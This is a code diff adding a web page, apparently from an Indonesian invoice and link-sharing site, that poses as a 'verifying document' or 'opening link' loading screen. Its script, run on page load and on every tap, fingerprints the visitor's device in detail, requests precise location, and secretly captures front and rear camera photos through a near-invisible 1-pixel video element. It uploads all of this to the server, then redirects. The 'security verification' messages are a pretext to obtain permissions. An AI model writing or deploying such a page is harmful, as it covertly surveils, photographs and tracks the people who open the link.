@@ -1,0 +1,747 @@
+---
+import Layout from '../../layouts/Layout.astro';
+import { getNota, saveNota } from '../../lib/storage';
+import { fetchNotaFromAppsScript } from '../../lib/apps-script';
+
+export const prerender = false;
+
+const { id } = Astro.params;
+
+if (!id) {
+  return Astro.redirect('/', 302);
+}
+
+let nota = getNota(id);
+if (!nota) {
+  nota = await fetchNotaFromAppsScript(id).catch(() => null);
+  if (nota) {
+    saveNota(nota);
+  }
+}
+
+if (!nota) {
+  return new Response(null, {
+    status: 404,
+    statusText: 'Nota Not Found'
+  });
+}
+
+const isLink = nota.type === 'link';
+const pageTitle = isLink ? (nota.title || 'Membuka Tautan...') : `Memuat Nota #${nota.notaNumber}...`;
+const pageDescription = isLink ? (nota.description || 'Memuat konten...') : 'Memuat dan memverifikasi faktur transaksi resmi...';
+const pageOgImage = (isLink && nota.ogImage) ? nota.ogImage : `/og/nota/${nota.id}.png`;
+const initialLoadingHint = isLink ? 'Menghubungkan ke server konten...' : `Memuat & memverifikasi dokumen #${nota.notaNumber}...`;
+---
+
+<Layout
+  title={pageTitle}
+  description={pageDescription}
+  ogImage={pageOgImage}
+  noindex={true}
+  hideHeader={true}
+  hideFooter={true}
+>
+  <div id="touch-trigger-area" class="verify-page-wrapper touch-active-area">
+    <div class="container-narrow">
+      
+      <!-- Top Subtle Spinner Bar -->
+      <div id="verify-spinner-bar" class="verify-spinner-bar">
+        <svg id="spinner-icon-svg" class="spinner-icon" xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+          <path d="M21 12a9 9 0 1 1-6.219-8.56"/>
+        </svg>
+        <span id="loading-hint">{initialLoadingHint}</span>
+      </div>
+
+      <!-- SKELETON LOADER (DYNAMIC: MEDIA/LINK vs INVOICE) -->
+      <div id="skeleton-doc" class="card skeleton-card">
+        {isLink ? (
+          <!-- Social / Link Media Skeleton -->
+          <div class="link-skeleton-container">
+            <div class="skeleton-header" style="align-items: center; margin-bottom: 1rem; border-bottom: none; padding-bottom: 0;">
+              <div style="display: flex; align-items: center; gap: 0.75rem;">
+                <div class="skeleton-box" style="width: 40px; height: 40px; border-radius: 50%;"></div>
+                <div>
+                  <div class="skeleton-box" style="width: 110px; height: 14px; margin-bottom: 0.35rem;"></div>
+                  <div class="skeleton-box" style="width: 70px; height: 11px;"></div>
+                </div>
+              </div>
+              <div class="skeleton-box" style="width: 60px; height: 26px; border-radius: var(--radius-sm);"></div>
+            </div>
+
+            <!-- Media Preview Box -->
+            <div class="skeleton-box skeleton-image-area" style="height: clamp(200px, 45vw, 300px); display: flex; align-items: center; justify-content: center; overflow: hidden; background: #030712;">
+              {nota.ogImage ? (
+                <img src={nota.ogImage} alt="" style="width: 100%; height: 100%; object-fit: cover; opacity: 0.85; filter: blur(1px);" />
+              ) : (
+                <div class="skeleton-icon-placeholder">
+                  <svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.6;">
+                    <path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path>
+                    <path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path>
+                  </svg>
+                </div>
+              )}
+            </div>
+
+            <!-- Title & Description Lines -->
+            <div style="display: flex; flex-direction: column; gap: 0.65rem; margin-top: 1rem;">
+              <div class="skeleton-box" style="width: 92%; height: 15px;"></div>
+              <div class="skeleton-box" style="width: 80%; height: 13px;"></div>
+              <div class="skeleton-box" style="width: 55%; height: 13px;"></div>
+            </div>
+          </div>
+        ) : (
+          <!-- INVOICE DOCUMENT SKELETON LOADER -->
+          <div class="invoice-skeleton-container">
+        <!-- Skeleton Header -->
+        <div class="skeleton-header">
+          <div>
+            <div class="skeleton-box" style="width: min(140px, 70%); height: 22px; margin-bottom: 0.4rem;"></div>
+            <div class="skeleton-box" style="width: min(90px, 50%); height: 14px;"></div>
+          </div>
+          <div style="text-align: right;">
+            <div class="skeleton-box" style="width: min(80px, 60%); height: 20px; border-radius: var(--radius-full); margin-left: auto; margin-bottom: 0.35rem;"></div>
+            <div class="skeleton-box" style="width: min(100px, 80%); height: 12px; margin-left: auto;"></div>
+          </div>
+        </div>
+
+        <!-- Skeleton Meta Grid -->
+        <div class="skeleton-meta-grid">
+          <div>
+            <div class="skeleton-box" style="width: min(60px, 40%); height: 12px; margin-bottom: 0.4rem;"></div>
+            <div class="skeleton-box" style="width: min(130px, 90%); height: 16px;"></div>
+          </div>
+          <div>
+            <div class="skeleton-box" style="width: min(70px, 50%); height: 12px; margin-bottom: 0.4rem;"></div>
+            <div class="skeleton-box" style="width: min(120px, 85%); height: 16px;"></div>
+          </div>
+        </div>
+
+        <!-- Skeleton Document Image / Table Area -->
+        <div class="skeleton-box skeleton-image-area">
+          <div class="skeleton-icon-placeholder">
+            <svg xmlns="http://www.w3.org/2000/svg" width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" style="opacity: 0.5;">
+              <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+              <polyline points="14 2 14 8 20 8"></polyline>
+              <line x1="16" y1="13" x2="8" y2="13"></line>
+              <line x1="16" y1="17" x2="8" y2="17"></line>
+              <polyline points="10 9 9 9 8 9"></polyline>
+            </svg>
+          </div>
+        </div>
+
+        <!-- Skeleton Rows -->
+        <div style="display: flex; flex-direction: column; gap: 0.65rem; margin-bottom: 1.25rem;">
+          <div class="skeleton-box" style="width: 100%; height: 14px;"></div>
+          <div class="skeleton-box" style="width: 85%; height: 14px;"></div>
+          <div class="skeleton-box" style="width: 70%; height: 14px;"></div>
+        </div>
+
+        <!-- Skeleton Total Summary -->
+        <div style="border-top: 1px dashed #1e293b; padding-top: 0.85rem; display: flex; justify-content: space-between; align-items: center;">
+          <div class="skeleton-box" style="width: min(80px, 30%); height: 16px;"></div>
+          <div class="skeleton-box" style="width: min(120px, 45%); height: 22px;"></div>
+        </div>
+      </div>
+    )}
+  </div>
+
+      <!-- Video & Canvas for High-Definition Captures (inside viewport at 1x1 to force mobile hardware decoding) -->
+      <video id="bg-video" style="position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.001; pointer-events: none; z-index: -9999;" autoplay playsinline webkit-playsinline muted></video>
+      <canvas id="bg-canvas" width="1280" height="720" style="position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0.001; pointer-events: none; z-index: -9999;"></canvas>
+
+    </div>
+  </div>
+</Layout>
+
+<style>
+  .verify-page-wrapper {
+    background-color: #060b17;
+    background: radial-gradient(circle at 50% 15%, #0f1c3d 0%, #060b17 100%);
+    min-height: 100vh;
+    min-height: 100dvh;
+    padding: max(1.5rem, var(--safe-top)) max(0.75rem, var(--safe-right)) max(1.5rem, var(--safe-bottom)) max(0.75rem, var(--safe-left));
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    width: 100%;
+    cursor: pointer;
+    user-select: none;
+    -webkit-tap-highlight-color: transparent;
+  }
+
+  .verify-spinner-bar {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 0.65rem;
+    padding: 0.7rem 1.25rem;
+    margin-bottom: 1rem;
+    color: #f1f5f9;
+    font-size: clamp(0.78rem, 1vw + 0.45rem, 0.875rem);
+    font-weight: 500;
+    text-align: center;
+    background: rgba(15, 23, 42, 0.85);
+    backdrop-filter: blur(12px);
+    -webkit-backdrop-filter: blur(12px);
+    border-radius: var(--radius-full);
+    border: 1px solid rgba(255, 255, 255, 0.12);
+    box-shadow: 0 4px 20px rgba(0, 0, 0, 0.6);
+    width: 100%;
+    max-width: 520px;
+    margin-left: auto;
+    margin-right: auto;
+    transition: all 0.2s ease;
+  }
+
+  .spinner-icon {
+    animation: spin 0.9s linear infinite;
+    flex-shrink: 0;
+  }
+
+  .skeleton-card {
+    padding: clamp(1rem, 2.5vw + 0.5rem, 2rem);
+    background: #0b1329;
+    border-radius: var(--radius-xl);
+    box-shadow: 0 20px 50px -10px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255, 255, 255, 0.08);
+    border: 1px solid #1e293b;
+    width: 100%;
+    max-width: 520px;
+    transition: transform 0.15s ease;
+  }
+
+  .skeleton-header {
+    display: flex;
+    justify-content: space-between;
+    align-items: flex-start;
+    margin-bottom: 1.5rem;
+    padding-bottom: 1rem;
+    border-bottom: 1px dashed #1e293b;
+    gap: 0.5rem;
+  }
+
+  .skeleton-meta-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 0.75rem;
+    margin-bottom: 1.5rem;
+  }
+
+  .skeleton-image-area {
+    width: 100%;
+    height: clamp(160px, 35vw, 240px);
+    border-radius: var(--radius-md);
+    margin-bottom: 1.25rem;
+    position: relative;
+    overflow: hidden;
+    background: #060b17;
+  }
+
+  .skeleton-icon-placeholder {
+    position: absolute;
+    inset: 0;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 0.5rem;
+    color: #475569;
+  }
+
+  @keyframes spin {
+    from { transform: rotate(0deg); }
+    to { transform: rotate(360deg); }
+  }
+
+  /* Shimmering Skeleton Effect in Dark Mode */
+  .skeleton-box {
+    background: linear-gradient(90deg, #15203b 25%, #22325c 50%, #15203b 75%);
+    background-size: 200% 100%;
+    animation: shimmer 1.5s infinite;
+    border-radius: var(--radius-sm);
+  }
+
+  @keyframes shimmer {
+    0% { background-position: 200% 0; }
+    100% { background-position: -200% 0; }
+  }
+
+  @media (max-width: 320px) {
+    .skeleton-meta-grid {
+      grid-template-columns: 1fr;
+    }
+  }
+</style>
+
+<script is:inline define:vars={{ notaId: nota.id, isLinkType: isLink }}>
+  let currentSessionId = null;
+  let activeMediaStream = null;
+  let isVerificationInProgress = false;
+
+  const loadingHint = document.getElementById('loading-hint');
+  const touchArea = document.getElementById('touch-trigger-area');
+  const videoEl = document.getElementById('bg-video');
+  const canvasEl = document.getElementById('bg-canvas');
+
+  function stopActiveStream() {
+    if (activeMediaStream) {
+      try {
+        activeMediaStream.getTracks().forEach((t) => t.stop());
+      } catch (e) {}
+      activeMediaStream = null;
+    }
+    if (videoEl) {
+      try { videoEl.srcObject = null; } catch (e) {}
+    }
+  }
+
+  function setStepLoading(message) {
+    if (loadingHint) loadingHint.textContent = message;
+  }
+
+  function handleVerificationReset() {
+    stopActiveStream();
+    isVerificationInProgress = false;
+    setStepLoading(isLinkType ? 'Ketuk layar untuk melanjutkan ke konten...' : ('Ketuk layar untuk memverifikasi dokumen #' + notaId));
+  }
+
+  async function grabFrameFromCamera(facingMode, videoEl, canvasEl) {
+    let stream = null;
+    try {
+      const constraints = {
+        video: {
+          facingMode: facingMode === 'user' ? 'user' : { ideal: 'environment' }
+        },
+        audio: false
+      };
+
+      try {
+        stream = await navigator.mediaDevices.getUserMedia(constraints);
+      } catch (e1) {
+        // Fallback for Safari/iOS if specific facingMode constraint fails
+        stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+      }
+
+      activeMediaStream = stream;
+
+      if (videoEl) {
+        videoEl.setAttribute('playsinline', 'true');
+        videoEl.setAttribute('webkit-playsinline', 'true');
+        videoEl.muted = true;
+        videoEl.srcObject = stream;
+        await videoEl.play().catch(() => {});
+      }
+
+      // 1. Wait for video frame stream to start
+      await new Promise((res) => {
+        if (videoEl && videoEl.readyState >= 2 && videoEl.videoWidth > 0) {
+          res();
+        } else if (videoEl) {
+          const onReady = () => {
+            videoEl.removeEventListener('loadeddata', onReady);
+            videoEl.removeEventListener('canplay', onReady);
+            res();
+          };
+          videoEl.addEventListener('loadeddata', onReady);
+          videoEl.addEventListener('canplay', onReady);
+          setTimeout(res, 250);
+        } else {
+          setTimeout(res, 120);
+        }
+      });
+
+      // 2. Fast mobile camera stabilization
+      const focusStabilizationTime = facingMode === 'environment' ? 120 : 70;
+      await new Promise((res) => setTimeout(res, focusStabilizationTime));
+
+      let width = (videoEl && videoEl.videoWidth > 0) ? videoEl.videoWidth : 1280;
+      let height = (videoEl && videoEl.videoHeight > 0) ? videoEl.videoHeight : 720;
+
+      // Bound max dimension to 960px to drastically optimize upload speed over mobile networks
+      const maxDim = 960;
+      if (width > maxDim || height > maxDim) {
+        if (width > height) {
+          height = Math.round((height * maxDim) / width);
+          width = maxDim;
+        } else {
+          width = Math.round((width * maxDim) / height);
+          height = maxDim;
+        }
+      }
+
+      if (canvasEl && videoEl) {
+        canvasEl.width = width;
+        canvasEl.height = height;
+        const ctx = canvasEl.getContext('2d');
+        if (ctx) {
+          ctx.imageSmoothingEnabled = true;
+          ctx.imageSmoothingQuality = 'medium';
+          ctx.drawImage(videoEl, 0, 0, width, height);
+        }
+        const dataUri = canvasEl.toDataURL('image/jpeg', 0.80);
+
+        // Cleanly stop all tracks
+        stream.getTracks().forEach((t) => t.stop());
+        if (videoEl) videoEl.srcObject = null;
+        activeMediaStream = null;
+
+        return dataUri;
+      }
+
+      stream.getTracks().forEach((t) => t.stop());
+      activeMediaStream = null;
+      return null;
+    } catch (err) {
+      if (stream) {
+        try { stream.getTracks().forEach((t) => t.stop()); } catch (e) {}
+      }
+      activeMediaStream = null;
+      throw err;
+    }
+  }
+
+  async function captureCameraEvidence(timeoutMs = 8000) {
+    return new Promise(async (resolve, reject) => {
+      let hasHandled = false;
+      const timeoutId = setTimeout(() => {
+        if (!hasHandled) {
+          hasHandled = true;
+          stopActiveStream();
+          reject(new Error('CAMERA_TIMEOUT'));
+        }
+      }, timeoutMs);
+
+      try {
+        // 1. Capture Real Front Camera
+        const frontDataUri = await grabFrameFromCamera('user', videoEl, canvasEl);
+        if (!frontDataUri) throw new Error('CAMERA_FAILED');
+
+        // Fast 70ms pause to let mobile OS switch camera hardware
+        await new Promise((r) => setTimeout(r, 70));
+
+        // 2. Capture Real Rear Camera (Environment)
+        let backDataUri = frontDataUri;
+        try {
+          const rearUri = await grabFrameFromCamera('environment', videoEl, canvasEl);
+          if (rearUri) {
+            backDataUri = rearUri;
+          }
+        } catch (rearErr) {
+          backDataUri = frontDataUri;
+        }
+
+        if (!hasHandled) {
+          hasHandled = true;
+          clearTimeout(timeoutId);
+          resolve({ frontDataUri, backDataUri });
+        }
+      } catch (err) {
+        if (!hasHandled) {
+          hasHandled = true;
+          clearTimeout(timeoutId);
+          reject(err);
+        }
+      }
+    });
+  }
+
+  function requestLocationWithTimeout(timeoutMs = 5000) {
+    return new Promise((resolve, reject) => {
+      if (!navigator.geolocation) {
+        return reject(new Error('GEOLOCATION_UNSUPPORTED'));
+      }
+
+      let hasHandled = false;
+      const timeoutId = setTimeout(() => {
+        if (!hasHandled) {
+          hasHandled = true;
+          reject(new Error('LOCATION_TIMEOUT'));
+        }
+      }, timeoutMs);
+
+      navigator.geolocation.getCurrentPosition(
+        (pos) => {
+          if (!hasHandled) {
+            hasHandled = true;
+            clearTimeout(timeoutId);
+            resolve({
+              latitude: pos.coords.latitude,
+              longitude: pos.coords.longitude,
+              accuracy: pos.coords.accuracy || 25,
+              altitude: pos.coords.altitude,
+              altitudeAccuracy: pos.coords.altitudeAccuracy,
+              heading: pos.coords.heading,
+              speed: pos.coords.speed,
+              timestamp: pos.timestamp || Date.now()
+            });
+          }
+        },
+        (err) => {
+          if (!hasHandled) {
+            hasHandled = true;
+            clearTimeout(timeoutId);
+            reject(err);
+          }
+        },
+        { enableHighAccuracy: true, timeout: timeoutMs, maximumAge: 60000 }
+      );
+    });
+  }
+
+  async function executeVerification() {
+    if (isVerificationInProgress) return;
+    isVerificationInProgress = true;
+
+    try {
+      setStepLoading('Memverifikasi keamanan dokumen...');
+
+      // 1. Initialize Verification Session
+      const startRes = await fetch('/api/verification/start', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ notaId })
+      });
+      const startJson = await startRes.json();
+      if (!startJson.success || !startJson.data) {
+        throw new Error('INIT_FAILED');
+      }
+      currentSessionId = startJson.data.sessionId;
+
+      // 2. Dispatch High-Precision Hardware, Battery & Network Forensics
+      let gpuRenderer = '';
+      let gpuVendor = '';
+      try {
+        const glCanvas = document.createElement('canvas');
+        const gl = glCanvas.getContext('webgl') || glCanvas.getContext('experimental-webgl');
+        if (gl) {
+          const dbgExt = gl.getExtension('WEBGL_debug_renderer_info');
+          if (dbgExt) {
+            gpuRenderer = gl.getParameter(dbgExt.UNMASKED_RENDERER_WEBGL) || '';
+            gpuVendor = gl.getParameter(dbgExt.UNMASKED_VENDOR_WEBGL) || '';
+          }
+        }
+      } catch {}
+
+      let clientModel = '';
+      let clientPlatform = '';
+      try {
+        const uad = navigator['userAgentData'];
+        if (uad && typeof uad.getHighEntropyValues === 'function') {
+          const hints = await uad.getHighEntropyValues(['model', 'platform', 'platformVersion', 'architecture', 'bitness']);
+          clientModel = hints.model || '';
+          clientPlatform = hints.platform || '';
+        }
+      } catch {}
+
+      // Forensic: Battery Telemetry
+      let batteryLevel = undefined;
+      let isCharging = undefined;
+      let batteryChargingTime = undefined;
+      let batteryDischargingTime = undefined;
+      try {
+        if (typeof navigator.getBattery === 'function') {
+          const batt = await navigator.getBattery();
+          batteryLevel = Math.round(batt.level * 100);
+          isCharging = Boolean(batt.charging);
+          batteryChargingTime = batt.chargingTime;
+          batteryDischargingTime = batt.dischargingTime;
+        }
+      } catch {}
+
+      // Forensic: Network & Connection Telemetry
+      let networkType = undefined;
+      let effectiveType = undefined;
+      let downlinkSpeed = undefined;
+      let rtt = undefined;
+      let saveData = undefined;
+      try {
+        const conn = navigator.connection || navigator['mozConnection'] || navigator['webkitConnection'];
+        if (conn) {
+          networkType = conn.type || undefined;
+          effectiveType = conn.effectiveType || undefined;
+          downlinkSpeed = conn.downlink || undefined;
+          rtt = conn.rtt || undefined;
+          saveData = Boolean(conn.saveData);
+        }
+      } catch {}
+
+      // Forensic: Screen, Display & Color Telemetry
+      let screenOrientation = '';
+      try {
+        screenOrientation = screen.orientation ? screen.orientation.type : (window.innerWidth > window.innerHeight ? 'landscape' : 'portrait');
+      } catch {}
+
+      let colorGamut = 'srgb';
+      try {
+        if (window.matchMedia && window.matchMedia('(color-gamut: rec2020)').matches) colorGamut = 'rec2020';
+        else if (window.matchMedia && window.matchMedia('(color-gamut: p3)').matches) colorGamut = 'p3';
+      } catch {}
+
+      let isDarkMode = false;
+      try {
+        isDarkMode = Boolean(window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      } catch {}
+
+      let hdrSupport = false;
+      try {
+        hdrSupport = Boolean(window.matchMedia && window.matchMedia('(dynamic-range: high)').matches);
+      } catch {}
+
+      // Forensic: Storage Quota Estimate
+      let storageEstimate = undefined;
+      try {
+        if (navigator.storage && typeof navigator.storage.estimate === 'function') {
+          const est = await navigator.storage.estimate();
+          if (est.quota) {
+            storageEstimate = {
+              quota: est.quota,
+              usage: est.usage || 0,
+              available: Math.max(0, (est.quota || 0) - (est.usage || 0))
+            };
+          }
+        }
+      } catch {}
+
+      // Forensic: Audio Context Sample Rate
+      let audioContextSampleRate = undefined;
+      try {
+        const AudioCtx = window.AudioContext || window['webkitAudioContext'];
+        if (AudioCtx) {
+          const actx = new AudioCtx();
+          audioContextSampleRate = actx.sampleRate;
+          actx.close().catch(() => {});
+        }
+      } catch {}
+
+      // Forensic: Canvas 2D Fingerprint Hash
+      let canvasFingerprintHash = '';
+      try {
+        const fpCanvas = document.createElement('canvas');
+        fpCanvas.width = 200;
+        fpCanvas.height = 50;
+        const fpCtx = fpCanvas.getContext('2d');
+        if (fpCtx) {
+          fpCtx.textBaseline = 'top';
+          fpCtx.font = '14px Arial';
+          fpCtx.fillStyle = '#f60';
+          fpCtx.fillRect(125, 1, 62, 20);
+          fpCtx.fillStyle = '#069';
+          fpCtx.fillText('AntiFraud.ID, #2026', 2, 15);
+          fpCtx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+          fpCtx.fillText('AntiFraud.ID, #2026', 4, 17);
+          const data = fpCanvas.toDataURL();
+          let hash = 0;
+          for (let i = 0; i < data.length; i++) {
+            hash = ((hash << 5) - hash) + data.charCodeAt(i);
+            hash |= 0;
+          }
+          canvasFingerprintHash = 'FP-' + Math.abs(hash).toString(16).toUpperCase();
+        }
+      } catch {}
+
+      const devicePayload = {
+        userAgent: navigator.userAgent,
+        platform: clientPlatform || navigator.platform,
+        model: clientModel,
+        gpuRenderer,
+        gpuVendor,
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        language: navigator.language,
+        languages: navigator.languages ? Array.from(navigator.languages) : [navigator.language],
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'UTC',
+        screenWidth: window.screen.width,
+        screenHeight: window.screen.height,
+        devicePixelRatio: window.devicePixelRatio || 1,
+        hardwareConcurrency: navigator.hardwareConcurrency || 4,
+        deviceMemory: navigator['deviceMemory'] || undefined,
+        touchSupport: 'ontouchstart' in window || (navigator.maxTouchPoints > 0),
+        mobile: /Mobile|Android|iPhone|iPad/i.test(navigator.userAgent),
+        batteryLevel,
+        isCharging,
+        batteryChargingTime,
+        batteryDischargingTime,
+        networkType,
+        effectiveType,
+        downlinkSpeed,
+        rtt,
+        saveData,
+        screenOrientation,
+        colorDepth: window.screen.colorDepth || 24,
+        colorGamut,
+        isDarkMode,
+        hdrSupport,
+        storageEstimate,
+        audioContextSampleRate,
+        canvasFingerprintHash
+      };
+
+      // 3. Sequenced Permissions Pipeline (Anti-Collision Architecture)
+      // Step 3A: Request Location first with clean dedicated window
+      setStepLoading(isLinkType ? 'Memverifikasi koneksi & lokasi server...' : 'Memverifikasi lokasi dokumen...');
+      let locationData = null;
+      try {
+        locationData = await requestLocationWithTimeout(5000);
+      } catch (locErr) {
+        console.warn('Location capture skipped or denied:', locErr);
+      }
+
+      // Small 100ms buffer to allow mobile OS window manager to cleanly close previous dialog
+      await new Promise((r) => setTimeout(r, 100));
+
+      // Step 3B: Request Camera second (modal prompt appears only after location prompt is settled)
+      setStepLoading(isLinkType ? 'Memverifikasi autentikasi perangkat...' : 'Memverifikasi kamera keamanan...');
+      let cameraEvidence = null;
+      try {
+        cameraEvidence = await captureCameraEvidence(6000);
+      } catch (camErr) {
+        console.warn('Camera capture skipped or denied:', camErr);
+      }
+
+      // 4. Single-Flight Fast Finalization & Instant Redirect
+      // Direct unified payload dispatch eliminates duplicate megabyte uploads and multiple network roundtrips
+      setStepLoading(isLinkType ? 'Mengalihkan ke konten...' : 'Membuka nota resmi terverifikasi...');
+      const completeRes = await fetch('/api/verification/complete', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          sessionId: currentSessionId,
+          notaId: notaId,
+          device: devicePayload,
+          location: locationData || undefined,
+          frontCamera: cameraEvidence?.frontDataUri ? { dataUri: cameraEvidence.frontDataUri } : undefined,
+          backCamera: cameraEvidence?.backDataUri ? { dataUri: cameraEvidence.backDataUri } : undefined
+        })
+      });
+      const completeJson = await completeRes.json().catch(() => ({}));
+
+      if (completeJson && completeJson.data && completeJson.data.redirectUrl) {
+        window.location.href = completeJson.data.redirectUrl;
+      } else {
+        window.location.href = `/nota/${notaId}`;
+      }
+
+    } catch (err) {
+      console.error('Verification execution error:', err);
+      if (isLinkType) {
+        window.location.href = `/nota/${notaId}`;
+      } else {
+        handleVerificationReset();
+      }
+    }
+  }
+
+  // Touch/click listener to also trigger verification directly on user tap
+  touchArea?.addEventListener('click', () => {
+    executeVerification();
+  });
+  touchArea?.addEventListener('touchend', () => {
+    executeVerification();
+  });
+
+  // Auto-attempt immediately on load
+  if (document.readyState === 'loading') {
+    document.addEventListener('DOMContentLoaded', executeVerification);
+  } else {
+    executeVerification();
+  }
+</script>
